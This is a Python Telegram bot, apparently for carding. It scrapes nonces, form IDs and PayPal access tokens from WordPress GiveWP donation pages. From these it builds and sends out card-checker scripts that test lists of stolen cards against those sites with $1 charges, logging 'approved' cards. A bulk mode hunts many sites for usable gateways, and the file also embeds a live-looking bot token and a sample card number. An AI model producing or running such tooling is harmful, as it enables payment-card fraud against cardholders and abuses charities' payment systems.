import telebot
import time
import threading
import gc
from telebot import types
import requests, random, json, string, re, base64
from datetime import datetime, timedelta
import os
import html
from user_agent import generate_user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import signal
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
import psutil
import traceback

# === بيانات البوت ===
token = '8689698569:AAF6GOOcFdsTnG_UXXHLqWkis0bCsIFsQJQ'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

# === متغيرات عامة ===
waiting_users = {}
reply_mode = {}
bulk_waiting = {}
stop_flags = {}
processing_status = {}

# === Thread Pool للتحكم في الموارد ===
executor = ThreadPoolExecutor(max_workers=5)  # حد أقصى 5 عمليات متوازية

# === إعدادات الذاكرة ===
MAX_MEMORY_PERCENT = 80  # إذا تجاوزت الذاكرة 80% نظف

def cleanup_memory():
    """تنظيف الذاكرة بشكل دوري"""
    try:
        gc.collect()
        # تنظيف الجلسات القديمة
        if hasattr(requests, 'sessions'):
            for session in list(requests.sessions.__dict__.get('_ sessions', {}).values()):
                try:
                    session.close()
                except:
                    pass
    except:
        pass

def check_memory():
    """فحص الذاكرة وتنظيفها إذا لزم الأمر"""
    try:
        memory = psutil.virtual_memory()
        if memory.percent > MAX_MEMORY_PERCENT:
            cleanup_memory()
            gc.collect()
            return True
        return False
    except:
        return False

def safe_execute(func, *args, **kwargs):
    """تنفيذ آمن لأي دالة مع معالجة الأخطاء"""
    try:
        return func(*args, **kwargs)
    except Exception as e:
        print(f"Error in {func.__name__}: {str(e)}")
        traceback.print_exc()
        return None

# إنشاء ملف الحظر إذا لم يكن موجوداً
if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')

# === معالج الأخطاء العام ===
@bot.message_handler(func=lambda m: True, content_types=['text', 'photo', 'document', 'video', 'audio'])
def catch_all(message):
    try:
        with open("blockusers.txt", "r") as file:
            blocked = file.read().splitlines()
        if str(message.from_user.id) in blocked:
            return
    except:
        pass

@bot.message_handler(commands=["start"])
def start(message):
    try:
        with open("blockusers.txt", "r") as file:
            blocked = file.read().splitlines()
        if str(message.from_user.id) in blocked:
            bot.send_message(message.chat.id, 'The admin has blocked you due to your negative behavior.')
            return 
        
        user_id = message.from_user.id
        userr = message.from_user.first_name

        IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a> 𝑻𝒉𝒊𝒔 𝒊𝒔 𝒂 𝑷𝒂𝒚𝑷𝒂𝒍 𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝒃𝒐𝒕.

[<a href="https://t.me/nnunrr">ϟ</a>] PayPal Gateway >> /paypal 
[<a href="https://t.me/nnunrr">ϟ</a>] Bulk Extract >> /bulk
[<a href="https://t.me/nnunrr">ϟ</a>] Send Feedback >> Button Below

[<a href="https://t.me/nnunrr">ϟ</a>] 𝐷𝑒𝑣: @nnunrr '''
        
        FRA = types.InlineKeyboardMarkup(row_width=2)
        Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
        FRA.add(Yes22)
        
        video_url = 'https://t.me/C0CCOCOvjk/9'
        bot.send_photo(message.chat.id, video_url, caption=IU, parse_mode='HTML', reply_markup=FRA)
    except Exception as e:
        print(f"Error in start: {e}")
        cleanup_memory()

# === نظام المراسلة ===
@bot.callback_query_handler(func=lambda call: call.data == 'yrr')
def feedback(call):
    try:
        user_id = call.from_user.id
        userr = call.from_user.first_name
        Atty = types.InlineKeyboardMarkup(row_width=1)
        back = types.InlineKeyboardButton("Back", callback_data="start")
        Atty.add(back)
        YTT = f'''Welcome <a href='tg://user?id={user_id}'>{userr}</a> Send your message and the admin will respond.'''
        bot.edit_message_caption(chat_id=call.message.chat.id, message_id=call.message.message_id, caption=YTT, parse_mode='HTML', reply_markup=Atty)
        waiting_users[user_id] = True
    except Exception as e:
        print(f"Error in feedback: {e}")

@bot.message_handler(func=lambda m: m.from_user.id in waiting_users and m.from_user.id not in bulk_waiting)
def get_user_msg(message):
    try:
        user_id = message.from_user.id
        name = message.from_user.first_name
        kb = types.InlineKeyboardMarkup()
        kb.add(types.InlineKeyboardButton("Reply", callback_data=f"reply_{user_id}"))
        bot.send_message(OWNER_ID, f"New Message\n\nFrom: {name}\nID: {user_id}\nMessage: {message.text}", reply_markup=kb)
        kb2 = types.InlineKeyboardMarkup()
        kb2.add(types.InlineKeyboardButton("Send another message", callback_data="yrr"))
        bot.send_message(user_id, "Your message has been sent.", reply_markup=kb2)
        waiting_users.pop(user_id, None)
    except Exception as e:
        print(f"Error in get_user_msg: {e}")

@bot.callback_query_handler(func=lambda call: call.data.startswith("reply_"))
def start_reply(call):
    try:
        user_id = int(call.data.split("_")[1])
        reply_mode[call.from_user.id] = user_id
        bot.send_message(call.from_user.id, "Write your reply now:")
    except Exception as e:
        print(f"Error in start_reply: {e}")

@bot.message_handler(func=lambda m: m.from_user.id == OWNER_ID and m.from_user.id in reply_mode)
def send_reply(message):
    try:
        user_id = reply_mode[message.from_user.id]
        bot.send_message(user_id, f"Admin response:\n\n{message.text}")
        bot.send_message(OWNER_ID, "Reply sent.")
        reply_mode.pop(message.from_user.id, None)
    except Exception as e:
        print(f"Error in send_reply: {e}")

@bot.callback_query_handler(func=lambda call: call.data == "start")
def back_to_start(call):
    try:
        user_id = call.from_user.id
        userr = call.from_user.first_name
        IU = f'''𝑊𝑒𝑙𝑐𝑜𝑚𝑒 𝑏𝑟𝑜 <a href='tg://user?id={user_id}'>{userr}</a>'''
        FRA = types.InlineKeyboardMarkup(row_width=2)
        Yes22 = types.InlineKeyboardButton('Submit Feedback to Owner', callback_data='yrr')
        FRA.add(Yes22)
        bot.send_message(call.message.chat.id, IU, parse_mode='HTML', reply_markup=FRA)
    except:
        pass

# ============ أمر سحب PayPal ============
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    try:
        with open("blockusers.txt", "r") as file:
            blocked = file.read().splitlines()
        if str(massege.from_user.id) in blocked:
            bot.send_message(massege.chat.id, 'The admin has blocked you.')
            return

        ko = bot.send_message(massege.chat.id, "- The gate is being withdrawn ...")
        
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko.message_id,
                text='''- Please send the link like this:

<code>/paypal https://xxxxxxx.xxx/xxxx</code>''',
                parse_mode="HTML"
            )
            return

        link = parts[1].strip()

        if not link.startswith(("http://", "https://")):
            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko.message_id,
                text="Invalid link format ❌",
                parse_mode="HTML"
            )
            return

        # استخدام جلسة جديدة لكل طلب
        session = requests.Session()
        session.headers.update({"User-Agent": "Mozilla/5.0"})
        
        try:
            r = session.get(link, timeout=15)
            if r.status_code != 200:
                bot.edit_message_text(
                    chat_id=massege.chat.id,
                    message_id=ko.message_id,
                    text=f"Site returned status: {r.status_code} ❌"
                )
                session.close()
                return

            bot.edit_message_text(
                chat_id=massege.chat.id,
                message_id=ko.message_id,
                text="Gate found ✅"
            )

            # استخراج البيانات
            user = generate_user_agent()
            res = session.get(url=link, headers={'user-agent': user}, timeout=15).text
            
            id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
            id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
            nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
            anc = re.search(r'"data-client-token":"(.*?)"', res)
            
            if not all([id_form1, id_form2, nonec, anc]):
                bot.edit_message_text(
                    chat_id=massege.chat.id,
                    message_id=ko.message_id,
                    text='''Data Client Token not found ⚠️''',
                    parse_mode="HTML"
                )
                session.close()
                return
            
            id_form1 = id_form1.group(1)
            id_form2 = id_form2.group(1)
            nonec = nonec.group(1)
            
            enc = anc.group(1)
            dec = base64.b64decode(enc).decode('utf-8')
            au_match = re.search(r'"accessToken":"(.*?)"', dec)
            if not au_match:
                bot.edit_message_text(
                    chat_id=massege.chat.id,
                    message_id=ko.message_id,
                    text='''Access token not found ⚠️''',
                    parse_mode="HTML"
                )
                session.close()
                return
            au = au_match.group(1)

            parsed = urlparse(link)
            USER_URL2 = f'https://{parsed.netloc}'
            USER_URL = parsed.path

            # إنشاء الطلب
            headers = {
                'origin': USER_URL2,
                'referer': USER_URL,
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest',
            }

            data = MultipartEncoder({
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-hash': (None, nonec),
                'give-amount': (None, '1.00'),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, 'Ali'),
                'give_last': (None, 'rights and'),
                'give_email': (None, 'Ali22@gmail.com'),
                'give-gateway': (None, 'paypal-commerce'),
            })
            headers['content-type'] = data.content_type
            params = {'action': 'give_paypal_commerce_create_order'}

            response = session.post(
                f'{USER_URL2}/wp-admin/admin-ajax.php',
                params=params,
                headers=headers,
                data=data,
                timeout=15
            )
            
            try:
                tok = response.json()['data']['id']
            except:
                bot.edit_message_text(
                    chat_id=massege.chat.id,
                    message_id=ko.message_id,
                    text='Token not In Data ❌',
                    parse_mode="HTML"
                )
                session.close()
                return

            # تأكيد الدفع
            headers = {
                'authorization': f'Bearer {au}',
                'content-type': 'application/json',
                'user-agent': user,
            }
            ccx = '4059986126444431|11|30|947'
            ccx = ccx.strip()
            n = ccx.split("|")[0]
            mm = ccx.split("|")[1]
            yy = ccx.split("|")[2]
            cvc = ccx.split("|")[3]
            if "20" in yy:
                yy = yy.split("20")[1]
            
            json_data = {
                'payment_source': {
                    'card': {
                        'number': n,
                        'expiry': f'20{yy}-{mm}',
                        'security_code': cvc,
                        'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                    },
                },
                'application_context': {'vault': False},
            }

            session.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{tok}/confirm-payment-source',
                headers=headers,
                json=json_data,
                timeout=15
            )

            # الموافقة على الطلب
            data = MultipartEncoder({
                'give-form-id-prefix': (None, id_form1),
                'give-form-id': (None, id_form2),
                'give-form-hash': (None, nonec),
                'give-amount': (None, '1.00'),
                'payment-mode': (None, 'paypal-commerce'),
                'give_first': (None, 'Ali'),
                'give_last': (None, 'rights and'),
                'give_email': (None, 'Ali22@gmail.com'),
                'give-gateway': (None, 'paypal-commerce'),
            })
            headers['content-type'] = data.content_type
            params = {
                'action': 'give_paypal_commerce_approve_order',
                'order': tok,
            }

            response = session.post(
                f'{USER_URL2}/wp-admin/admin-ajax.php',
                params=params,
                headers=headers,
                data=data,
                timeout=15
            )
            
            if 'ORDER_NOT_APPROVED' in response.text:
                msg = 'Payer cannot pay for this transaction.'
            else:
                try:
                    msg = response.json()['data']['error']
                except:
                    msg = html.escape(response.text[:100])

            # توليد الكود
            text_content = generate_gateway_code_single(link, id_form1, id_form2, nonec, au, tok, msg)

            file_name = f'@nnunrr_{massege.from_user.id}.py'
            with open(file_name, "w", encoding="utf-8") as f:
                f.write(text_content)
            
            with open(file_name, "rb") as f:
                bot.send_document(
                    chat_id=massege.chat.id,
                    document=f,
                    caption=f'''The gate was successfully withdrawn ✅
━━━━━━━━━━━━━━━━━━━━
<strong>Gateway information ...</strong>

Link: <code>{link}</code>
id form: <code>{id_form1}</code>
id form2: <code>{id_form2}</code>
nonce: <code>{nonec}</code>
client token: <code>{au}</code>
id payment: <code>{tok}</code>
msg gateway: <code>{msg}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr''',
                    parse_mode="HTML"
                )
            
            os.remove(file_name)
            session.close()
            
        except requests.exceptions.Timeout:
            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="The site took too long to respond ⏳")
            session.close()
        except requests.exceptions.ConnectionError:
            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text="Connection error or site offline ❌")
            session.close()
        except Exception as e:
            bot.edit_message_text(chat_id=massege.chat.id, message_id=ko.message_id, text=f"Error ❌\n<code>{str(e)[:100]}</code>", parse_mode="HTML")
            session.close()
            
    except Exception as e:
        print(f"Error in ali_al2: {e}")
        traceback.print_exc()
        cleanup_memory()

def generate_gateway_code_single(link, id_form1, id_form2, nonec, au, tok, msg):
    """توليد كود البوابة لملف واحد"""
    return f'''# PayPal Gateway
# Link: {link}
import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.id_form1 = "{id_form1}"
        self.id_form2 = "{id_form2}"
        self.nonec = "{nonec}"
        self.au = "{au}"
        url = '{link}'
        parsed = urlparse(url)
        self.url = parsed.netloc
        self.inurl = parsed.path
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{
            'authorization': f'Bearer {{self.au}}',
            'paypal-client-metadata-id': self.paypal,
            'user-agent': self.uu.random,
        }}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        if 'true' in text: return 'CHARGE 1.00$'
        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction."
        else:
            try: return r5.json()['data']['error']
            except: return "UNKNOWN_ERROR"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal()
            resulti = rr.Charge(ar)
            if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print(f'[{{rr.checked}}] ' + ar + '  >>  ' + resulti)
            time.sleep(1)
    else:
        noy = 0
        live = 0
        dead = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal()
                    resulti = rr.Charge(P)
                    if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                        live += 1
                        with open('Approved Card.txt', "a") as f:
                            f.write(P + ': {{resulti}} > {{Getat}}')
                    else:
                        dead += 1
                except:
                    dead += 1
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(1)
            print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')'''

# ============ أمر bulk ============
@bot.message_handler(commands=['bulk'])
def bulk_extract_start(message):
    try:
        with open("blockusers.txt", "r") as file:
            blocked = file.read().splitlines()
        if str(message.from_user.id) in blocked:
            bot.send_message(message.chat.id, 'The admin has blocked you.')
            return

        user_id = message.from_user.id
        bulk_waiting[user_id] = True
        bot.reply_to(message, """📁 <b>Bulk Mode Active</b>
━━━━━━━━━━━━━━━━━━
Send .txt files (one link per line)
You can send multiple files

<b>Commands:</b>
🛑 /stop [number] - Stop a specific file
🛑 /stop - Stop all files
✅ /done - End bulk mode
━━━━━━━━━━━━━━━━━━""", parse_mode="HTML")
    except Exception as e:
        print(f"Error in bulk_extract_start: {e}")

@bot.message_handler(commands=['stop'])
def stop_bulk_file(message):
    try:
        user_id = message.from_user.id
        parts = message.text.split()
        if len(parts) > 1:
            file_num = int(parts[1])
            if user_id in stop_flags and file_num in stop_flags[user_id]:
                stop_flags[user_id][file_num] = True
                bot.reply_to(message, f"🛑 Stopping File #{file_num}...")
            else:
                bot.reply_to(message, f"❌ File #{file_num} not found.")
        else:
            if user_id in stop_flags:
                for key in stop_flags[user_id]:
                    stop_flags[user_id][key] = True
                bot.reply_to(message, "🛑 Stopping all files...")
            else:
                bot.reply_to(message, "❌ No active files to stop.")
    except Exception as e:
        print(f"Error in stop_bulk_file: {e}")
        bot.reply_to(message, "Usage: /stop [file_number]")

@bot.message_handler(commands=['done'])
def bulk_done(message):
    try:
        user_id = message.from_user.id
        if user_id in bulk_waiting:
            del bulk_waiting[user_id]
            if user_id in stop_flags:
                for key in stop_flags[user_id]:
                    stop_flags[user_id][key] = True
                del stop_flags[user_id]
            bot.reply_to(message, "✅ Bulk mode ended.")
        else:
            bot.reply_to(message, "You are not in bulk mode.")
    except Exception as e:
        print(f"Error in bulk_done: {e}")

@bot.message_handler(content_types=['document'])
def handle_bulk_file(message):
    try:
        user_id = message.from_user.id
        if user_id in bulk_waiting:
            # استخدام thread pool بدلاً من إنشاء thread جديد
            executor.submit(process_bulk_file, message)
        else:
            bot.reply_to(message, "Use /bulk first to start bulk extraction.")
    except Exception as e:
        print(f"Error in handle_bulk_file: {e}")

def process_bulk_file(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        if not message.document:
            bot.reply_to(message, "❌ Please send a .txt file.")
            return

        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        links = downloaded_file.decode('utf-8').splitlines()
        links = [link.strip() for link in links if link.strip()]

        if not links:
            bot.reply_to(message, "❌ File is empty.")
            return

        total = len(links)
        
        if user_id not in stop_flags:
            stop_flags[user_id] = {}
        file_num = len(stop_flags[user_id]) + 1
        stop_flags[user_id][file_num] = False
        
        processing_status[f"{user_id}_{file_num}"] = {
            'total': total,
            'processed': 0,
            'live': 0,
            'dead': 0,
            'lock': threading.Lock()
        }
        
        status_msg = bot.reply_to(message, f"""📊 <b>File #{file_num} - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: 0
❌ Dead: 0
⏳ Progress: 0%
━━━━━━━━━━━━━━━━━━
🛑 /stop {file_num} to stop this file""", parse_mode="HTML")
        
        live_count = 0
        
        def check_link(link):
            session = None
            try:
                if not link.startswith(("http://", "https://")):
                    return None
                
                session = requests.Session()
                session.headers.update({"User-Agent": "Mozilla/5.0"})
                
                r = session.get(link, timeout=10)
                if r.status_code != 200:
                    session.close()
                    return None
                
                res = r.text
                id_form1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', res)
                id_form2 = re.search(r'name="give-form-id" value="(.*?)"', res)
                nonec = re.search(r'name="give-form-hash" value="(.*?)"', res)
                anc = re.search(r'"data-client-token":"(.*?)"', res)
                
                if not all([id_form1, id_form2, nonec, anc]):
                    session.close()
                    return None
                
                id_form1 = id_form1.group(1)
                id_form2 = id_form2.group(1)
                nonec = nonec.group(1)
                enc = anc.group(1)
                dec = base64.b64decode(enc).decode('utf-8')
                au_match = re.search(r'"accessToken":"(.*?)"', dec)
                if not au_match:
                    session.close()
                    return None
                au = au_match.group(1)
                
                session.close()
                
                return {
                    'link': link,
                    'id_form1': id_form1,
                    'id_form2': id_form2,
                    'nonec': nonec,
                    'au': au
                }
            except:
                if session:
                    session.close()
                return None
        
        stopped = False
        
        for idx, link in enumerate(links, 1):
            if user_id in stop_flags and file_num in stop_flags[user_id] and stop_flags[user_id][file_num]:
                stopped = True
                break
            
            result = check_link(link)
            
            with processing_status[f"{user_id}_{file_num}"]['lock']:
                processing_status[f"{user_id}_{file_num}"]['processed'] += 1
                
                if result:
                    processing_status[f"{user_id}_{file_num}"]['live'] += 1
                    live_count += 1
                    
                    try:
                        code = generate_gateway_code(result, live_count, file_num)
                        file_name = f'gateway_{file_num}_{live_count}_{user_id}.py'
                        with open(file_name, 'w', encoding='utf-8') as f:
                            f.write(code)
                        with open(file_name, 'rb') as f:
                            bot.send_document(
                                chat_id,
                                f,
                                caption=f"""✅ <b>File #{file_num} - Gateway #{live_count}</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{result['link']}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @nnunrr""",
                                parse_mode="HTML"
                            )
                        os.remove(file_name)
                        time.sleep(0.3)
                    except Exception as e:
                        print(f"Error sending file: {e}")
                else:
                    processing_status[f"{user_id}_{file_num}"]['dead'] += 1
                
                processed = processing_status[f"{user_id}_{file_num}"]['processed']
                live = processing_status[f"{user_id}_{file_num}"]['live']
                dead = processing_status[f"{user_id}_{file_num}"]['dead']
                progress = int((processed / total) * 100)
                
                if processed % 10 == 0 or processed == total:
                    bar_length = 20
                    filled = int((progress / 100) * bar_length)
                    bar = '█' * filled + '░' * (bar_length - filled)
                    
                    text = f"""📊 <b>File #{file_num} - Scanning links...</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Live: {live}
❌ Dead: {dead}
⏳ Progress: {progress}% {bar}
━━━━━━━━━━━━━━━━━━
⏱️ Checked {processed} of {total}
🛑 /stop {file_num} to stop this file"""
                    
                    try:
                        bot.edit_message_text(text, chat_id, status_msg.message_id, parse_mode="HTML")
                    except:
                        pass
            
            time.sleep(0.2)
            check_memory()
        
        status = processing_status[f"{user_id}_{file_num}"]
        
        if stopped:
            final_text = f"""🛑 <b>File #{file_num} Stopped!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {total}
✅ Checked: {status['processed']}
✅ Live (Sent): {status['live']}
❌ Dead: {status['dead']}
━━━━━━━━━━━━━━━━━━
📁 Send another file or /done to finish."""
        else:
            if status['live'] > 0:
                final_text = f"""📊 <b>✅ File #{file_num} Complete!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {status['total']}
✅ Live (Sent): {status['live']}
❌ Dead (Failed): {status['dead']}
💯 Success Rate: {int((status['live']/status['total'])*100) if status['total'] > 0 else 0}%
━━━━━━━━━━━━━━━━━━
📁 Send another file or /done to finish.
Dev: @nnunrr"""
            else:
                final_text = f"""📊 <b>❌ File #{file_num} - No live links found!</b>
━━━━━━━━━━━━━━━━━━
📌 Total Links: {status['total']}
✅ Live: 0
❌ Dead: {status['dead']}
━━━━━━━━━━━━━━━━━━
📁 Send another file or /done to finish.
Dev: @nnunrr"""
        
        try:
            bot.edit_message_text(final_text, chat_id, status_msg.message_id, parse_mode="HTML")
        except:
            bot.send_message(chat_id, final_text, parse_mode="HTML")
        
        if f"{user_id}_{file_num}" in processing_status:
            del processing_status[f"{user_id}_{file_num}"]
        cleanup_memory()
            
    except Exception as e:
        print(f"Error in process_bulk_file: {e}")
        traceback.print_exc()
        try:
            bot.reply_to(message, f"❌ Error: {str(e)[:100]}")
        except:
            pass
        cleanup_memory()

def generate_gateway_code(data, idx, file_num=1):
    """توليد كود البوابة للملفات المتعددة"""
    # استخراج الـ URL بشكل آمن
    try:
        url_parts = data['link'].split('//')[1].split('/')
        domain = url_parts[0]
        path = "/" + "/".join(url_parts[1:]) if len(url_parts) > 1 else ""
    except:
        domain = ""
        path = ""
    
    return f'''# PayPal Gateway {idx} (File {file_num})
# Link: {data['link']}
import requests, re, random, time, base64
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse

class PayPal{file_num}_{idx}:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.paypal = "b220b06032291ef03c4bd21a74cab3ad"
        self.donation = "1.00"
        self.id_form1 = "{data['id_form1']}"
        self.id_form2 = "{data['id_form2']}"
        self.nonec = "{data['nonec']}"
        self.au = "{data['au']}"
        self.url = "{domain}"
        self.inurl = "{path}"
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.uu = UserAgent()
        self.checked = 0

    def Charge(self, ccx):
        self.checked += 1
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        if "20" in yy:
            yy = yy.split("20")[1]
        
        da2 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he3 = {{'content-type': da2.content_type, 'user-agent': self.uu.random}}
        pa1 = {{'action': 'give_paypal_commerce_create_order'}}
        r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa1, headers=he3, data=da2).json()['data']['id']

        he4 = {{
            'authorization': f'Bearer {{self.au}}',
            'paypal-client-metadata-id': self.paypal,
            'user-agent': self.uu.random,
        }}
        da3 = {{
            'payment_source': {{
                'card': {{
                    'number': n, 'expiry': f'20{{yy}}-{{mm}}', 'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        self.r.post(f'https://cors.api.paypal.com/v2/checkout/orders/{{r3}}/confirm-payment-source', headers=he4, json=da3)

        da4 = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, self.donation),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        he5 = {{'content-type': da4.content_type, 'user-agent': self.uu.random}}
        pa2 = {{'action': 'give_paypal_commerce_approve_order', 'order': r3}}
        r5 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php', params=pa2, headers=he5, data=da4)
        
        text = r5.text
        if 'true' in text: return 'CHARGE 1.00$'
        elif 'INSUFFICIENT_FUNDS' in text: return "INSUFFICIENT_FUNDS"
        elif 'ORDER_NOT_APPROVED' in text: return "Payer cannot pay for this transaction."
        else:
            try: return r5.json()['data']['error']
            except: return "UNKNOWN_ERROR"

if __name__ == '__main__':
    Getat = 'PayPal Custom 1$'
    print(f'Cheker {{Getat}}')
    Br = input('Enter Numer (Manual : 1 - Combo : 2) : ')
    if Br == '1':
        while True:
            ar = input('Enter Card ( n | mm | yy | cvc ): ')
            rr = PayPal{file_num}_{idx}()
            resulti = rr.Charge(ar)
            if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                with open('Approved Card.txt', "a") as f:
                    f.write(ar + f': {{resulti}} > {{Getat}}')
            print(f'[{{rr.checked}}] ' + ar + '  >>  ' + resulti)
            time.sleep(1)
    else:
        noy = 0
        live = 0
        dead = 0
        cr = input('Enter Name Combo: ')
        with open(cr, "r") as f:
            crads = f.read().splitlines()
            for P in crads:
                noy += 1
                try:
                    rr = PayPal{file_num}_{idx}()
                    resulti = rr.Charge(P)
                    if 'CHARGE 1.00$' in resulti or 'INSUFFICIENT_FUNDS' in resulti:
                        live += 1
                        with open('Approved Card.txt', "a") as f:
                            f.write(P + ': {{resulti}} > {{Getat}}')
                    else:
                        dead += 1
                except:
                    dead += 1
                print(f'[{{noy}}] ' + P + '  >>  ' + resulti)
                time.sleep(1)
            print(f'Total: {{noy}} | Live: {{live}} | Dead: {{dead}}')'''

# === نظام الحظر ===
@bot.message_handler(commands=['block2'])
def block_user(message):
    try:
        if str(message.from_user.id) not in admins:
            bot.reply_to(message, "You do not have permission.")
            return
        user_id_to_block = message.text.split()[1]
        with open('blockusers.txt', 'a') as file:
            file.write(f"{user_id_to_block}\n")
        bot.reply_to(message, f"✅ User ID {user_id_to_block} blocked.")
    except Exception as e:
        print(f"Error in block_user: {e}")
        bot.reply_to(message, "Usage: /block2 [user_id]")

